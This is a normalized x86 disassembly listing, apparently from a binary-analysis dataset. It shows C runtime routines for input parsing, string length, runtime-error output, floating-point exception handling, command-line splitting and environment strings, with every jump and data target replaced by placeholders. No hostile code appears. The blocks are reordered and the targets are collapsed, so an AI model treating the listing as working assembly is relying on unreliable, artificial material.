and [ ebp - 0x4a ] 0x0
and [ ebp - 0x4b ] 0x0
and [ ebp - 0x4c ] 0x0
and [ ebp - 0x4d ] 0x0
and [ ebp - 0x4e ] 0x0
mov [ ebp - 0x4f ] 0x1
mov [ ebp - 0x54 ] edi
inc [ ebp - 0x30 ]
mov edx [ ebp + 0x8 ]
call sub_42ceef
mov esi eax
push esi
call sub_429cb9
pop ecx
test eax eax
jne r-xdata
cmp esi 0xffffffff
je r-xdata
cmp ebx 0xffffffff
movzx eax bl
mov ecx [ rw-data ]
test [ ecx + eax * 2 + 0x1 ] 0x80
je r-xdata
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
and eax 0x4
push 0x4
push eax
call sub_42c0a8
pop ecx
pop ecx
jmp r-xdata
inc [ ebp + 0xc ]
mov eax [ ebp + 0xc ]
movzx eax [ eax ]
push eax
call sub_429cb9
pop ecx
test eax eax
jne r-xdata
push [ ebp + 0x8 ]
push esi
call sub_42fc43
pop ecx
pop ecx
push [ ebp + 0x8 ]
push [ ebp - 0x28 ]
call sub_42fc43
pop ecx
pop ecx
jmp r-xdata
inc [ ebp - 0x30 ]
mov edx [ ebp + 0x8 ]
call sub_42ceef
movzx ecx [ esi ]
inc esi
mov [ ebp + 0xc ] esi
cmp ecx eax
je r-xdata
cmp ebx 0x4e
jg r-xdata
inc [ ebp - 0x44 ]
lea eax [ edi + edi * 4 ]
lea edi [ ebx + eax * 2 - 0x30 ]
jmp r-xdata
test eax eax
je r-xdata
jmp r-xdata
dec [ ebp - 0x30 ]
cmp eax 0xffffffff
je r-xdata
cmp ebx 0x68
je r-xdata
je r-xdata
cmp [ ebp - 0x4c ] 0x0
je r-xdata
push [ ebp + 0x8 ]
push eax
call sub_42fc43
pop ecx
pop ecx
dec [ ebp - 0x4f ]
dec [ ebp - 0x4e ]
cmp ebx 0x6c
je r-xdata
cmp ebx 0x2a
je r-xdata
inc esi
movzx ebx [ esi ]
movzx eax bl
cmp [ rw-data ] 0x1
jle r-xdata
mov [ ebp - 0x48 ] edi
mov [ ebp + 0xc ] esi
cmp [ ebp - 0x4b ] 0x0
jne r-xdata
inc [ ebp - 0x4f ]
cmp ebx 0x77
je r-xdata
inc [ ebp - 0x4b ]
jmp r-xdata
cmp ebx 0x46
je r-xdata
mov ebx [ ebp - 0x64 ]
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x60 ] eax
add eax 0x4
mov [ ebp + 0x10 ] eax
mov ebx [ eax - 0x4 ]
mov [ ebp - 0x64 ] ebx
jmp r-xdata
inc [ ebp - 0x4e ]
jmp r-xdata
inc [ ebp - 0x4c ]
jmp r-xdata
cmp ebx 0x49
je r-xdata
movzx edi [ esi ]
or edi 0x20
mov [ ebp - 0x68 ] edi
cmp edi 0x6e
je r-xdata
mov al [ esi ]
cmp al 0x53
je r-xdata
and [ ebp - 0x4c ] 0x0
cmp [ ebp - 0x4e ] 0x0
jne r-xdata
mov cl [ esi + 0x1 ]
cmp cl 0x36
jne r-xdata
cmp ebx 0x4c
jne r-xdata
mov ecx [ ebp - 0x44 ]
test ecx ecx
je r-xdata
cmp edi 0x63
je r-xdata
mov [ ebp - 0x4e ] 0x1
cmp al 0x43
je r-xdata
cmp cl 0x33
jne r-xdata
lea eax [ esi + 0x2 ]
cmp [ eax ] 0x34
jne r-xdata
inc [ ebp - 0x4f ]
jmp r-xdata
cmp edi 0x6f
jg r-xdata
cmp [ ebp - 0x48 ] 0x0
je r-xdata
inc [ ebp - 0x30 ]
mov edx [ ebp + 0x8 ]
call sub_42ceef
mov [ ebp - 0x28 ] eax
cmp edi 0x7b
je r-xdata
or [ ebp - 0x4e ] 0xff
jmp r-xdata
cmp cl 0x64
je r-xdata
lea eax [ esi + 0x2 ]
cmp [ eax ] 0x32
jne r-xdata
mov esi eax
inc [ ebp - 0x54 ]
and [ ebp - 0x5c ] 0x0
and [ ebp - 0x58 ] 0x0
jmp r-xdata
mov eax edi
sub eax 0x70
je r-xdata
je r-xdata
cmp [ ebp - 0x28 ] 0xffffffff
jmp r-xdata
inc [ ebp - 0x30 ]
mov edx [ ebp + 0x8 ]
call sub_42ceef
mov esi eax
push esi
call sub_429cb9
pop ecx
test eax eax
jne r-xdata
cmp cl 0x69
je r-xdata
mov esi eax
jmp r-xdata
mov [ ebp - 0x4f ] 0x1
sub eax 0x3
je r-xdata
mov ebx [ ebp - 0x28 ]
cmp ebx 0x2d
jne r-xdata
cmp edi 0x63
je r-xdata
je r-xdata
mov [ ebp - 0x28 ] esi
mov esi [ ebp + 0xc ]
jmp r-xdata
cmp cl 0x6f
je r-xdata
cmp ebx 0x2b
jne r-xdata
mov [ ebp - 0x4a ] 0x1
jmp r-xdata
cmp [ ebp - 0x4e ] 0x0
jle r-xdata
dec eax
dec eax
je r-xdata
test ecx ecx
jne r-xdata
cmp edi 0x64
je r-xdata
cmp cl 0x78
je r-xdata
cmp [ ebp - 0x54 ] 0x0
je r-xdata
dec [ ebp - 0x48 ]
jne r-xdata
mov esi ebx
dec [ ebp - 0x30 ]
cmp [ ebp - 0x28 ] 0xffffffff
je r-xdata
mov [ ebp - 0x4d ] 0x1
jmp r-xdata
sub eax 0x3
je r-xdata
mov [ ebp - 0x44 ] 0x1
inc [ ebp - 0x48 ]
jle r-xdata
cmp cl 0x58
jne r-xdata
cmp [ ebp - 0x4c ] 0x0
jne r-xdata
cmp [ ebp - 0x4c ] 0x0
jne r-xdata
inc [ ebp - 0x30 ]
mov edx [ ebp + 0x8 ]
call sub_42ceef
mov ebx eax
test ecx ecx
je r-xdata
mov ebx [ ebp - 0x28 ]
cmp ebx 0x2d
jne r-xdata
sub eax 0x3
je r-xdata
movzx eax [ esi ]
cmp eax [ ebp - 0x28 ]
je r-xdata
cmp edi 0x67
jle r-xdata
jmp r-xdata
cmp [ ebp - 0x4a ] 0x0
je r-xdata
mov esi 0x80
cmp [ ebp - 0x4a ] 0x0
je r-xdata
mov esi 0x80
mov [ ebp - 0x4c ] 0x1
jmp r-xdata
cmp ebx 0x2b
jne r-xdata
mov [ ebp - 0x4a ] 0x1
jmp r-xdata
cmp [ ebp - 0x4e ] 0x0
jle r-xdata
dec [ ebp - 0x29 ]
cmp [ ebp - 0x4b ] 0x0
jne r-xdata
lea esi [ ebp - 0x1c8 ]
mov ebx [ ebp - 0x28 ]
cmp ebx 0x2d
jne r-xdata
cmp edi 0x69
je r-xdata
cmp edi 0x46
jne r-xdata
neg [ ebp - 0x38 ]
cmp [ rw-data ] 0x1
jle r-xdata
cmp edi 0x70
je r-xdata
mov eax [ ebp - 0x5c ]
neg eax
mov ecx [ ebp - 0x58 ]
adc ecx 0x0
neg ecx
mov [ ebp - 0x5c ] eax
mov [ ebp - 0x58 ] ecx
jmp r-xdata
cmp [ rw-data ] 0x1
jle r-xdata
cmp edi 0x70
je r-xdata
cmp ebx 0x30
jne r-xdata
dec [ ebp - 0x48 ]
jne r-xdata
mov edi [ ebp + 0xc ]
inc edi
mov [ ebp + 0xc ] edi
mov [ ebp - 0x1cc ] edi
cmp [ edi ] 0x5e
jne r-xdata
mov [ ebp - 0x4d ] 0x1
mov eax [ ebp - 0x60 ]
mov [ ebp + 0x10 ] eax
jmp r-xdata
cmp ebx 0x2b
jne r-xdata
mov [ ebp - 0x1c8 ] bl
lea esi [ ebp - 0x1c7 ]
jmp r-xdata
push 0x64
pop edi
cmp edi 0x6e
jne r-xdata
cmp [ ebp - 0x40 ] 0x0
je r-xdata
and [ ebp - 0x40 ] 0x0
mov eax [ rw-data ]
movzx eax [ eax + ebx * 2 ]
and eax esi
push esi
push ebx
call sub_42c0a8
pop ecx
pop ecx
jmp r-xdata
cmp [ rw-data ] 0x1
jle r-xdata
mov eax [ rw-data ]
movzx eax [ eax + ebx * 2 ]
and eax esi
push esi
push ebx
call sub_42c0a8
pop ecx
pop ecx
jmp r-xdata
cmp [ rw-data ] 0x1
jle r-xdata
inc [ ebp - 0x30 ]
mov edx [ ebp + 0x8 ]
call sub_42ceef
mov ebx eax
mov [ ebp - 0x28 ] ebx
cmp bl 0x78
je r-xdata
inc [ ebp - 0x30 ]
mov edx [ ebp + 0x8 ]
call sub_42ceef
mov ebx eax
mov [ ebp - 0x28 ] ebx
test ecx ecx
je r-xdata
mov ebx [ ebp - 0x20 ]
test ebx ebx
jne r-xdata
inc edi
mov [ ebp - 0x1cc ] edi
or [ ebp - 0x49 ] 0xff
mov edi [ ebp + 0x8 ]
dec [ ebp - 0x48 ]
inc [ ebp - 0x30 ]
mov edi [ ebp + 0x8 ]
mov edx edi
call sub_42ceef
mov ebx eax
mov [ ebp - 0x28 ] ebx
jmp r-xdata
mov eax [ ebp - 0x30 ]
cmp [ ebp - 0x4b ] 0x0
je r-xdata
cmp [ ebp - 0x4b ] 0x0
jne r-xdata
inc [ ebp - 0x4c ]
shl [ ebp - 0x38 ] 0x4
mov eax ebx
call sub_42cebd
mov ebx eax
jmp r-xdata
test eax eax
je r-xdata
mov eax [ rw-data ]
movzx eax [ eax + ebx * 2 ]
and eax 0x4
push 0x4
push ebx
call sub_42c0a8
pop ecx
pop ecx
jmp r-xdata
inc [ ebp - 0x4c ]
mov eax [ ebp - 0x5c ]
mov ecx [ ebp - 0x58 ]
shld ecx eax 0x4
shl eax 0x4
mov [ ebp - 0x5c ] eax
mov [ ebp - 0x58 ] ecx
mov eax ebx
call sub_42cebd
mov ebx eax
jmp r-xdata
test eax eax
je r-xdata
mov eax [ rw-data ]
movzx eax [ eax + ebx * 2 ]
and eax 0x4
push 0x4
push ebx
call sub_42c0a8
pop ecx
pop ecx
jmp r-xdata
inc [ ebp - 0x30 ]
mov edx [ ebp + 0x8 ]
call sub_42ceef
mov ebx eax
mov [ ebp - 0x28 ] ebx
cmp [ ebp - 0x44 ] 0x0
je r-xdata
cmp bl 0x58
je r-xdata
mov [ ebp - 0x4c ] 0x1
jmp r-xdata
push 0x20
push 0x0
push ebx
call sub_42b940
add esp 0xc
cmp [ ebp - 0x68 ] 0x7b
jne r-xdata
and [ ebp - 0x4 ] ebx
push 0x20
pop eax
call sub_42a0c0
mov [ ebp - 0x18 ] esp
mov ebx esp
mov [ ebp - 0x20 ] ebx
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov [ ebp - 0x48 ] 0x15d
cmp [ ebp - 0x48 ] 0x15d
jle r-xdata
cmp [ ebp - 0x44 ] 0x0
je r-xdata
cmp [ ebp - 0x54 ] 0x0
je r-xdata
jmp r-xdata
inc [ ebp - 0x34 ]
mov ebx [ ebp - 0x64 ]
mov eax [ ebp - 0x38 ]
dec [ ebp - 0x30 ]
cmp ebx 0xffffffff
je r-xdata
inc [ ebp - 0x40 ]
mov eax [ ebp - 0x38 ]
lea eax [ eax + ebx - 0x30 ]
mov [ ebp - 0x38 ] eax
cmp [ ebp - 0x44 ] 0x0
je r-xdata
cmp [ ebp - 0x4c ] 0x0
jne r-xdata
cmp edi 0x6f
jne r-xdata
test eax eax
je r-xdata
dec [ ebp - 0x30 ]
cmp ebx 0xffffffff
je r-xdata
inc [ ebp - 0x40 ]
lea eax [ ebx - 0x30 ]
cdq
add [ ebp - 0x5c ] eax
adc [ ebp - 0x58 ] edx
cmp [ ebp - 0x44 ] 0x0
je r-xdata
cmp [ ebp - 0x4c ] 0x0
jne r-xdata
cmp edi 0x6f
jne r-xdata
test eax eax
je r-xdata
push 0x78
jmp r-xdata
sub [ ebp - 0x48 ] 0x2
cmp [ ebp - 0x48 ] 0x1
jge r-xdata
mov [ ebp - 0x40 ] 0x1
cmp edi 0x78
je r-xdata
mov eax [ rw-data ]
movzx eax [ eax + ebx * 2 ]
and eax 0x4
push 0x4
push ebx
call sub_42c0a8
pop ecx
pop ecx
jmp r-xdata
cmp [ rw-data ] 0x1
jle r-xdata
cmp [ ebp - 0x4f ] 0x0
je r-xdata
mov eax [ ebp - 0x5c ]
mov [ ebx ] eax
mov eax [ ebp - 0x58 ]
mov [ ebx + 0x4 ] eax
jmp r-xdata
cmp [ ebp - 0x4c ] 0x0
je r-xdata
push [ ebp + 0x8 ]
push ebx
call sub_42fc43
pop ecx
pop ecx
inc [ ebp - 0x30 ]
mov edx [ ebp + 0x8 ]
call sub_42ceef
mov ebx eax
jmp r-xdata
dec [ ebp - 0x48 ]
jne r-xdata
mov eax [ ebp - 0x38 ]
lea eax [ eax + eax * 4 ]
shl eax 0x1
mov [ ebp - 0x38 ] eax
jmp r-xdata
cmp ebx 0x38
jge r-xdata
cmp [ ebp - 0x4c ] 0x0
je r-xdata
push [ ebp + 0x8 ]
push ebx
call sub_42fc43
pop ecx
pop ecx
inc [ ebp - 0x30 ]
mov edx [ ebp + 0x8 ]
call sub_42ceef
mov ebx eax
jmp r-xdata
dec [ ebp - 0x48 ]
jne r-xdata
push 0x0
push 0xa
push [ ebp - 0x58 ]
push [ ebp - 0x5c ]
call sub_42fd80
mov [ ebp - 0x5c ] eax
mov [ ebp - 0x58 ] edx
jmp r-xdata
cmp ebx 0x38
jge r-xdata
pop edi
jmp r-xdata
inc [ ebp - 0x4c ]
dec [ ebp - 0x30 ]
cmp ebx 0xffffffff
je r-xdata
cmp [ ebp - 0x44 ] 0x0
je r-xdata
cmp [ rw-data ] bl
jne r-xdata
mov eax [ ebp - 0x48 ]
dec [ ebp - 0x48 ]
test eax eax
je r-xdata
test eax eax
je r-xdata
mov [ ebx ] ax
mov [ ebx ] eax
jmp r-xdata
cmp edi 0x78
je r-xdata
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x4c ] 0x1
jmp r-xdata
shl [ ebp - 0x38 ] 0x3
jmp r-xdata
cmp edi 0x78
je r-xdata
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x4c ] 0x1
jmp r-xdata
mov eax [ ebp - 0x5c ]
mov ecx [ ebp - 0x58 ]
shld ecx eax 0x3
shl eax 0x3
mov [ ebp - 0x5c ] eax
mov [ ebp - 0x58 ] ecx
jmp r-xdata
push 0x30
pop ebx
jmp r-xdata
push [ ebp + 0x8 ]
push ebx
call sub_42fc43
pop ecx
pop ecx
push 0x6f
dec [ ebp - 0x48 ]
jne r-xdata
cmp [ ebp - 0x40 ] 0x0
je r-xdata
mov eax [ ebp - 0x48 ]
dec [ ebp - 0x48 ]
test eax eax
je r-xdata
inc [ ebp - 0x40 ]
mov [ esi ] bl
inc esi
inc [ ebp - 0x30 ]
mov edx edi
call sub_42ceef
mov ebx eax
mov [ ebp - 0x28 ] ebx
jmp r-xdata
mov [ ebp - 0x28 ] ebx
inc [ ebp - 0x4c ]
dec [ ebp - 0x30 ]
cmp ebx 0xffffffff
je r-xdata
cmp ebx 0x65
je r-xdata
inc [ ebp - 0x30 ]
mov edx edi
call sub_42ceef
mov ebx eax
mov al [ rw-data ]
mov [ esi ] al
inc esi
cmp [ ebp - 0x40 ] 0x0
je r-xdata
push edi
push ebx
call sub_42fc43
pop ecx
pop ecx
mov eax [ ebp - 0x48 ]
dec [ ebp - 0x48 ]
test eax eax
je r-xdata
cmp ebx 0x45
jne r-xdata
mov eax [ rw-data ]
movzx eax [ eax + ebx * 2 ]
and eax 0x4
push 0x4
push ebx
call sub_42c0a8
pop ecx
pop ecx
jmp r-xdata
cmp [ ebp - 0x4b ] 0x0
jne r-xdata
mov [ esi ] 0x65
inc esi
inc [ ebp - 0x30 ]
mov edx edi
call sub_42ceef
mov ebx eax
mov [ ebp - 0x28 ] ebx
cmp ebx 0x2d
jne r-xdata
mov eax [ ebp - 0x48 ]
dec [ ebp - 0x48 ]
test eax eax
je r-xdata
test eax eax
je r-xdata
inc [ ebp - 0x34 ]
and [ esi ] 0x0
lea eax [ ebp - 0x1c8 ]
push eax
push [ ebp - 0x64 ]
movsx eax [ ebp - 0x4f ]
dec eax
push eax
call [ rw-data ]
add esp 0xc
jmp r-xdata
cmp ebx 0x2b
jne r-xdata
mov [ esi ] al
inc esi
jmp r-xdata
inc [ ebp - 0x40 ]
mov [ esi ] bl
inc esi
inc [ ebp - 0x30 ]
mov edx edi
call sub_42ceef
mov ebx eax
jmp r-xdata
cmp [ rw-data ] 0x1
jle r-xdata
mov eax [ ebp - 0x48 ]
dec [ ebp - 0x48 ]
test eax eax
jne r-xdata
mov [ ebp - 0x28 ] ebx
cmp [ rw-data ] 0x1
jle r-xdata
mov eax [ rw-data ]
movzx eax [ eax + ebx * 2 ]
and eax 0x4
push 0x4
push ebx
call sub_42c0a8
pop ecx
pop ecx
jmp r-xdata
mov edx edi
inc [ ebp - 0x30 ]
call sub_42ceef
mov ebx eax
mov [ ebp - 0x28 ] ebx
and [ ebp - 0x48 ] eax
jmp r-xdata
mov eax [ ebp - 0x48 ]
dec [ ebp - 0x48 ]
test eax eax
je r-xdata
test eax eax
je r-xdata
inc [ ebp - 0x40 ]
mov [ esi ] bl
inc esi
jmp r-xdata
sub_42daa0
mov ecx [ esp + 0x4 ]
test ecx 0x3
je r-xdata
mov eax [ ecx ]
mov edx 0x7efefeff
add edx eax
xor eax 0xffffffff
xor eax edx
add ecx 0x4
test eax 0x81010100
je r-xdata
mov al [ ecx ]
add ecx 0x1
test al al
je r-xdata
mov eax [ ecx - 0x4 ]
test al al
je r-xdata
lea eax [ ecx - 0x1 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ecx 0x3
jne r-xdata
lea eax [ ecx - 0x4 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ah ah
je r-xdata
add eax 0x0
lea esp [ esp ]
lea esp [ esp ]
lea eax [ ecx - 0x3 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff0000
je r-xdata
lea eax [ ecx - 0x2 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff000000
je r-xdata
jmp r-xdata
sub_42db2b
push ebp
mov ebp esp
sub esp 0x10c
mov eax [ rw-data ]
xor eax [ ebp + 0x4 ]
mov ecx [ ebp + 0x8 ]
push ebx
push esi
mov [ ebp - 0x4 ] eax
xor edx edx
push edi
xor eax eax
mov esi eax
shl esi 0x3
cmp ecx [ esi + rw-data ]
jne r-xdata
inc eax
cmp eax 0x12
jb r-xdata
lea esp [ ebp - 0x118 ]
mov ecx [ ebp - 0x4 ]
xor ecx [ ebp + 0x4 ]
call sub_42fac0
pop edi
pop esi
pop ebx
leave
retn
mov eax [ rw-data ]
cmp eax 0x1
je r-xdata
cmp ecx [ eax * 8 + rw-data ]
je r-xdata
push edx
lea eax [ ebp + 0x8 ]
push eax
lea esi [ esi + rw-data ]
push [ esi ]
call sub_42daa0
pop ecx
push eax
push [ esi ]
push 0xfffffff4
call [ GetStdHandle@IAT ]
push eax
call [ WriteFile@IAT ]
cmp eax edx
jne r-xdata
cmp ecx 0xfc
je r-xdata
cmp [ rw-data ] 0x1
je r-xdata
push 0x104
lea eax [ ebp - 0x10c ]
push eax
push edx
mov [ ebp - 0x8 ] dl
call [ GetModuleFileNameA@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x10c ]
push eax
lea edi [ ebp - 0x10c ]
call sub_42daa0
inc eax
cmp eax 0x3c
pop ecx
jbe r-xdata
lea eax [ ebp - 0x10c ]
push r--data
push eax
call sub_42f2b0
pop ecx
pop ecx
push edi
call sub_42daa0
push [ esi + rw-data ]
mov ebx eax
call sub_42daa0
lea eax [ ebx + eax + 0x1c ]
pop ecx
add eax 0x3
pop ecx
and eax 0xfffffffc
call sub_42a0c0
mov ebx esp
push r--data
push ebx
call sub_42f2b0
push edi
push ebx
call sub_42f2c0
push r--data
push ebx
call sub_42f2c0
push [ esi + rw-data ]
push ebx
call sub_42f2c0
push 0x12010
push r--data
push ebx
call sub_42fdb4
add esp 0x2c
jmp r-xdata
lea eax [ ebp - 0x10c ]
push eax
call sub_42daa0
mov edi eax
lea eax [ ebp - 0x10c ]
sub eax 0x3b
push 0x3
add edi eax
push r--data
push edi
call sub_42feb0
add esp 0x10
sub_42dca2
mov eax [ rw-data ]
cmp eax 0x1
je r-xdata
push 0xfc
call sub_42db2b
mov eax [ rw-data ]
test eax eax
pop ecx
je r-xdata
test eax eax
jne r-xdata
push 0xff
call sub_42db2b
pop ecx
call eax
retn
cmp [ rw-data ] 0x1
jne r-xdata
sub_42dcdb
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov eax [ rw-data ]
push ebx
mov ecx rw-data
push esi
lea eax [ eax + eax * 2 ]
lea eax [ eax * 4 + rw-data ]
cmp ecx eax
jae r-xdata
lea esi [ eax + eax * 2 ]
add ecx 0xc
lea esi [ esi * 4 + rw-data ]
cmp ecx esi
jb r-xdata
xor ecx ecx
cmp [ ecx ] edx
je r-xdata
cmp [ ecx ] edx
je r-xdata
push [ ebp + 0xc ]
call [ UnhandledExceptionFilter@IAT ]
mov ebx [ ecx + 0x8 ]
test ebx ebx
je r-xdata
test ecx ecx
je r-xdata
cmp ebx 0x5
jne r-xdata
cmp ebx 0x1
je r-xdata
and [ ecx + 0x8 ] 0x0
xor eax eax
inc eax
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ rw-data ]
mov [ ebp + 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ rw-data ] eax
mov eax [ ecx + 0x4 ]
cmp eax 0x8
jne r-xdata
pop esi
pop ebx
pop ebp
retn
and [ ecx + 0x8 ] 0x0
push eax
call ebx
mov eax [ rw-data ]
mov edx [ rw-data ]
add edx eax
cmp eax edx
jge r-xdata
mov ecx [ ecx ]
cmp ecx 0xc000008e
mov esi [ rw-data ]
jne r-xdata
lea esi [ eax + eax * 2 ]
lea esi [ esi * 4 + rw-data ]
sub edx eax
cmp ecx 0xc0000090
jne r-xdata
mov [ rw-data ] 0x83
jmp r-xdata
and [ esi ] 0x0
add esi 0xc
dec edx
jne r-xdata
cmp ecx 0xc0000091
jne r-xdata
mov [ rw-data ] 0x81
jmp r-xdata
push [ rw-data ]
push 0x8
call ebx
pop ecx
mov [ rw-data ] esi
jmp r-xdata
cmp ecx 0xc0000093
jne r-xdata
mov [ rw-data ] 0x84
jmp r-xdata
mov eax [ ebp + 0x8 ]
pop ecx
mov [ rw-data ] eax
cmp ecx 0xc000008d
jne r-xdata
mov [ rw-data ] 0x85
jmp r-xdata
cmp ecx 0xc000008f
jne r-xdata
mov [ rw-data ] 0x82
jmp r-xdata
cmp ecx 0xc0000092
jne r-xdata
mov [ rw-data ] 0x86
jmp r-xdata
mov [ rw-data ] 0x8a
sub_42de4c
cmp [ rw-data ] 0x0
jne r-xdata
push esi
mov esi [ rw-data ]
test esi esi
jne r-xdata
call sub_4303ec
mov al [ esi ]
cmp al 0x22
jne r-xdata
mov esi r--data
jmp r-xdata
cmp al 0x20
jbe r-xdata
inc esi
mov al [ esi ]
cmp al 0x22
je r-xdata
mov eax esi
pop esi
retn
mov al [ esi ]
test al al
jne r-xdata
inc esi
cmp [ esi ] 0x20
ja r-xdata
inc esi
test al al
je r-xdata
cmp al 0x20
ja r-xdata
jmp r-xdata
cmp [ esi ] 0x22
jne r-xdata
movzx eax al
push eax
call sub_430005
test eax eax
pop ecx
je r-xdata
jmp r-xdata
inc esi
mov al [ esi ]
cmp al 0x22
jne r-xdata
inc esi
sub_42deb5
push ebx
xor ebx ebx
cmp [ rw-data ] ebx
push esi
push edi
jne r-xdata
mov esi [ rw-data ]
xor edi edi
cmp esi ebx
jne r-xdata
call sub_4303ec
mov al [ esi ]
cmp al bl
jne r-xdata
jmp r-xdata
cmp al 0x3d
je r-xdata
lea eax [ edi * 4 + 0x4 ]
push eax
call sub_429a56
mov edi eax
cmp edi ebx
pop ecx
mov [ rw-data ] edi
jne r-xdata
or eax 0xffffffff
jmp r-xdata
push esi
call sub_42daa0
pop ecx
lea esi [ esi + eax + 0x1 ]
inc edi
mov esi [ rw-data ]
push ebp
jmp r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ esi ] bl
jne r-xdata
push esi
call sub_42daa0
mov ebp eax
inc ebp
cmp [ esi ] 0x3d
pop ecx
je r-xdata
push [ rw-data ]
call sub_429931
mov [ rw-data ] ebx
mov [ edi ] ebx
mov [ rw-data ] 0x1
xor eax eax
add esi ebp
push ebp
call sub_429a56
cmp eax ebx
pop ecx
mov [ edi ] eax
je r-xdata
push [ rw-data ]
call sub_429931
mov [ rw-data ] ebx
or eax 0xffffffff
jmp r-xdata
push esi
push eax
call sub_42f2b0
pop ecx
pop ecx
add edi 0x4
pop ecx
pop ebp
sub_42df7c
push ebp
mov ebp esp
push ecx
push ebx
mov ebx [ ebp + 0xc ]
xor edx edx
cmp [ ebp + 0x8 ] edx
push edi
mov [ esi ] edx
mov edi ecx
mov [ ebx ] 0x1
je r-xdata
cmp [ eax ] 0x22
jne r-xdata
mov ecx [ ebp + 0x8 ]
add [ ebp + 0x8 ] 0x4
mov [ ecx ] edi
inc [ esi ]
test edi edi
je r-xdata
xor ecx ecx
test edx edx
sete cl
inc eax
mov edx ecx
mov cl 0x22
jmp r-xdata
mov cl [ eax ]
movzx ebx cl
inc eax
test [ ebx + rw-data ] 0x4
je r-xdata
mov cl [ eax ]
mov [ edi ] cl
inc edi
test edx edx
jne r-xdata
test cl cl
mov ebx [ ebp + 0xc ]
je r-xdata
inc [ esi ]
test edi edi
je r-xdata
cmp cl 0x20
je r-xdata
dec eax
jmp r-xdata
inc eax
mov bl [ eax ]
mov [ edi ] bl
inc edi
test edi edi
je r-xdata
cmp cl 0x9
jne r-xdata
and [ ebp - 0x4 ] 0x0
and [ edi - 0x1 ] 0x0
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
mov cl [ eax ]
cmp cl 0x20
je r-xdata
inc [ ebx ]
pop edi
pop ebx
leave
retn
and [ eax ] 0x0
inc eax
jmp r-xdata
cmp cl 0x9
jne r-xdata
cmp [ eax ] 0x0
je r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
inc [ ebx ]
mov ecx [ ebp + 0x8 ]
add [ ebp + 0x8 ] 0x4
mov [ ecx ] edi
cmp [ eax ] 0x5c
je r-xdata
inc eax
inc edx
cmp [ eax ] 0x22
jne r-xdata
test edx edx
je r-xdata
test dl 0x1
jne r-xdata
mov cl [ eax ]
test cl cl
je r-xdata
test edi edi
je r-xdata
shr edx 0x1
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test edi edi
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
inc [ esi ]
dec edx
jne r-xdata
mov [ edi ] 0x5c
inc edi
xor ebx ebx
lea ecx [ eax + 0x1 ]
cmp [ ecx ] 0x22
jne r-xdata
inc [ esi ]
mov ebx [ ebp + 0xc ]
jmp r-xdata
and [ edi ] 0x0
inc edi
test ebx ebx
je r-xdata
cmp cl 0x20
je r-xdata
mov eax ecx
jmp r-xdata
cmp [ eax ] 0x0
je r-xdata
inc eax
jmp r-xdata
test edi edi
je r-xdata
cmp cl 0x9
je r-xdata
xor ecx ecx
cmp [ ebp - 0x4 ] ecx
sete cl
mov [ ebp - 0x4 ] ecx
xor ebx ebx
inc ebx
xor edx edx
jmp r-xdata
movzx ecx cl
test [ ecx + rw-data ] 0x4
je r-xdata
movzx edx cl
test [ edx + rw-data ] 0x4
je r-xdata
inc [ esi ]
inc eax
inc [ esi ]
mov cl [ eax ]
mov [ edi ] cl
inc edi
jmp r-xdata
mov [ edi ] cl
inc edi
inc eax
inc [ esi ]
sub_42e0e8
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
push edi
xor edi edi
cmp [ rw-data ] edi
jne r-xdata
and [ rw-data ] 0x0
push 0x104
mov esi rw-data
push esi
push edi
call [ GetModuleFileNameA@IAT ]
mov eax [ rw-data ]
cmp eax edi
mov [ rw-data ] esi
je r-xdata
call sub_4303ec
mov ebx esi
cmp [ eax ] 0x0
mov ebx eax
jne r-xdata
lea eax [ ebp - 0x4 ]
push eax
lea ecx [ esi + edi ]
push edi
lea esi [ ebp - 0x8 ]
mov eax ebx
call sub_42df7c
mov eax [ ebp - 0x4 ]
dec eax
pop ecx
mov [ rw-data ] eax
pop ecx
mov [ rw-data ] edi
xor eax eax
or eax 0xffffffff
jmp r-xdata
lea eax [ ebp - 0x4 ]
push eax
push edi
lea esi [ ebp - 0x8 ]
xor ecx ecx
mov eax ebx
call sub_42df7c
mov esi [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
shl esi 0x2
add eax esi
push eax
call sub_429a56
mov edi eax
add esp 0xc
test edi edi
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_42e18a
push ecx
push ecx
mov eax [ rw-data ]
push ebx
push ebp
push esi
push edi
mov edi [ GetEnvironmentStringsW@IAT ]
xor ebx ebx
xor esi esi
cmp eax ebx
push 0x2
pop ebp
jne r-xdata
cmp eax 0x1
jne r-xdata
call edi
mov esi eax
cmp esi ebx
je r-xdata
cmp eax ebp
je r-xdata
cmp esi ebx
jne r-xdata
call [ GetLastError@IAT ]
cmp eax 0x78
jne r-xdata
mov [ rw-data ] 0x1
jmp r-xdata
call [ GetEnvironmentStrings@IAT ]
mov esi eax
cmp esi ebx
je r-xdata
cmp eax ebx
je r-xdata
cmp [ esi ] bx
mov eax esi
je r-xdata
call edi
mov esi eax
cmp esi ebx
je r-xdata
mov eax [ rw-data ]
mov eax ebp
mov [ rw-data ] eax
jmp r-xdata
xor eax eax
jmp r-xdata
cmp [ esi ] bl
je r-xdata
mov edi [ WideCharToMultiByte@IAT ]
push ebx
push ebx
push ebx
sub eax esi
push ebx
sar eax 0x1
inc eax
push eax
push esi
push ebx
push ebx
mov [ esp + 0x34 ] eax
call edi
mov ebp eax
cmp ebp ebx
je r-xdata
add eax ebp
cmp [ eax ] bx
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
pop ecx
pop ecx
retn
sub eax esi
inc eax
